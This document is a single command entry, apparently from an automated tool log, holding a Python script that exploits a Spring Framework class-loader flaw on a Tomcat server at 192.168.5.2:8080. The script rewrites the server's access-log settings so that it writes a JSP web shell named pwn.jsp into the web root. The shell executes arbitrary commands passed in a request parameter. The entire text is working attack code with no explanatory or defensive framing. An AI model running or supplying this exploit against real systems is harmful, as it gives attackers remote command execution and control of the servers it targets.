commands.command:
python3 - <<'PY'
import http.client, urllib.parse
host = '192.168.5.2'
port = 8080
jsp = '''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream is = p.getInputStream();
    int ch;
    while ((ch = is.read()) != -1) {
        out.print((char) ch);
    }
    is.close();
}
%>
'''
pattern = jsp.replace('<%', '%{c1}i').replace('%>', '%{c2}i')
params = {
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern': pattern,
    'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
    'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'pwn',
    'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
    'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': '789'
}
query = urllib.parse.urlencode(params)
conn = http.client.HTTPConnection(host, port, timeout=10)
conn.request('GET', '/?' + query, headers={'c1': '<%', 'c2': '%>'})
res = conn.getresponse()
print(res.status, res.reason)
print(res.read().decode('utf-8', errors='ignore'))
conn.close()
PY

